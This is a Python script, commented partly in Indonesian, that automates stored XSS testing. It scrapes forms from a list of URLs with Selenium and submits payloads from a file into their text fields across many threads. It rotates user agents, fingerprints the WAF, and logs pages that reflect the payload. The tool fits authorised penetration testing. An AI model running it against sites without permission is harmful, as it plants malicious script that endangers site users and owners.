import requests
import argparse
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
import threading
import time
from termcolor import colored
import pprint  # for pretty printing form details
import os

# Fungsi untuk setup Selenium WebDriver (headless atau tidak)
def setup_selenium_driver(headless=True):
    print("[DEBUG] Setting up Selenium WebDriver")  # Debug
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(service=Service('/usr/local/bin/chromedriver'), options=chrome_options)
    return driver

# Fungsi untuk mendapatkan semua form dari halaman
def get_all_forms(url, use_selenium=False):
    print(f"[DEBUG] Fetching forms from {url} with Selenium: {use_selenium}")  # Debug
    if use_selenium:
        driver = setup_selenium_driver(headless=True)
        driver.get(url)
        time.sleep(3)
        html = driver.page_source
        driver.quit()
        soup = bs(html, "html.parser")
    else:
        soup = bs(requests.get(url).content, "html.parser")

    forms = soup.find_all("form")
    print(f"[DEBUG] Found {len(forms)} forms on {url}")  # Debug
    return forms

# Fungsi untuk mendapatkan detail dari setiap form
def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Fungsi untuk mengirimkan form dengan payload
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    print(f"[DEBUG] Submitting form to {target_url} with payload {value}")  # Debug
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# Fungsi untuk validasi popup XSS menggunakan Selenium
def validate_xss_popup(url, payload):
    driver = setup_selenium_driver(headless=False)
    try:
        driver.get(url)
        time.sleep(5)
        alert = driver.switch_to.alert
        alert_text = alert.text
        alert.accept()

        if payload in alert_text:
            print(colored(f"[SUCCESS] XSS popup detected on: {url}", "green"))
        else:
            print(colored(f"[FAILED] XSS popup not detected correctly on: {url}", "red"))

    except Exception as e:
        print(colored(f"[FAILED] No XSS popup detected for {url} with error: {e}", "red"))
    finally:
        driver.quit()

# Fungsi untuk mendeteksi WAF
def detect_waf(response):
    waf_signatures = {
        "Cloudflare": "cloudflare",
        "Akamai": "akamai",
        "AWS WAF": "aws",
        "Imperva": "imperva",
        "F5 BIG-IP": "f5"
    }
    for waf_name, signature in waf_signatures.items():
        if signature.lower() in response.text.lower():
            return waf_name
    return "No WAF Detected"

# Fungsi untuk menulis hasil sukses ke file log txt
def log_success_to_txt(txt_file, url, payload, status_code, title, waf, form_details, user_agent=None):
    with open(txt_file, mode='a') as file:
        file.write(f"[SUCCESS] URL: {url}\n")
        file.write(f"Payload: {payload}\n")
        file.write(f"Status Code: {status_code}\n")
        file.write(f"Page Title: {title}\n")
        file.write(f"WAF Protection: {waf}\n")
        file.write(f"Form Details: {form_details}\n")
        if user_agent:
            file.write(f"UA: {user_agent}\n")
        file.write("=========================================================\n\n")

# Fungsi untuk menampilkan detail hasil sukses di terminal
def display_success_details(url, payload, status_code, title, waf, form_details, user_agent=None):
    print(f"Payload: {payload}")
    print(f"Status Code: {status_code}")
    print(f"Page Title: {title}")
    print(f"WAF Protection: {waf}")
    print(f"Form Details: {form_details}")
    if user_agent:
        print(f"UA: {user_agent}")
    print("=" * 50)

# Fungsi untuk mengirim payload ke form yang terdeteksi
def send_payload_to_form(url, form, payload, headers, success_txt_file):
    form_details = get_form_details(form)
    response = submit_form(form_details, url, payload)

    # Pengecekan tipe konten sebelum melakukan parsing
    if "text/html" in response.headers.get("Content-Type", ""):
        soup = bs(response.content, 'html.parser')
        page_title = soup.title.string if soup.title else 'No Title'
    else:
        print(colored(f"[WARNING] The response from {url} is not HTML. Skipping...", "yellow"))
        page_title = 'No Title'

    waf_status = detect_waf(response)

    if payload in response.text:
        print(colored(f"[SUCCESS] Form submitted to: {url}", "green"))
        log_success_to_txt(success_txt_file, url, payload, response.status_code, page_title, waf_status, form_details, headers.get("User-Agent"))
        display_success_details(url, payload, response.status_code, page_title, waf_status, form_details, headers.get("User-Agent"))

        # Print form details for better understanding
        print(colored(f"Form details for {url}:", "blue"))
        pprint.pprint(form_details)
    else:
        print(colored(f"[FAILED] Payload not reflected on {url}", "red"))
        print(colored(f"Form details for {url}:", "yellow"))
        pprint.pprint(form_details)

# Fungsi untuk menjalankan pengujian setiap URL dengan threads
def test_url(url, payloads, use_random_user_agent):
    ua = UserAgent() if use_random_user_agent else None
    headers = {}
    domain = urlparse(url).netloc
    success_txt_file = f"stored_{domain}.txt"

    for payload in payloads:
        if use_random_user_agent:
            headers["User-Agent"] = ua.random
        else:
            headers["User-Agent"] = "Mozilla/5.0"

        forms = get_all_forms(url, use_selenium=True)
        if forms:
            for form in forms:
                headers["User-Agent"] = ua.random if use_random_user_agent else "Mozilla/5.0"
                send_payload_to_form(url, form, payload, headers, success_txt_file)
        else:
            print(f"[DEBUG] No forms found for {url}")  # Debug jika tidak ada form yang ditemukan

# Fungsi untuk menjalankan pengujian stored XSS dengan multi-threading
def xss_stored_test(urls, payloads, use_random_user_agent, threads):
    thread_list = []

    for url in urls:
        thread = threading.Thread(target=test_url, args=(url, payloads, use_random_user_agent))
        thread_list.append(thread)
        thread.start()

        if len(thread_list) >= threads:
            for t in thread_list:
                t.join()
            thread_list = []

    for t in thread_list:
        t.join()

# Fungsi untuk membaca payloads dari file
def load_payloads(payload_file):
    with open(payload_file, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Fungsi untuk membaca URL dari file
def load_urls(url_file):
    with open(url_file, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Main function to parse arguments and start the tests
def main():
    parser = argparse.ArgumentParser(description="Stored XSS Checker with Multi-Threading, Form Detection, and Detailed Output")
    parser.add_argument('-l', '--list', required=True, help="File berisi daftar URL (url.txt)")
    parser.add_argument('--threads', type=int, default=5, help="Jumlah threads yang digunakan untuk pengujian")
    parser.add_argument('--rua', action='store_true', help="Gunakan Random User Agent")
    args = parser.parse_args()

    urls = load_urls(args.list)
    payloads = load_payloads('payloads.txt')

    xss_stored_test(urls, payloads, args.rua, args.threads)

if __name__ == "__main__":
    main()
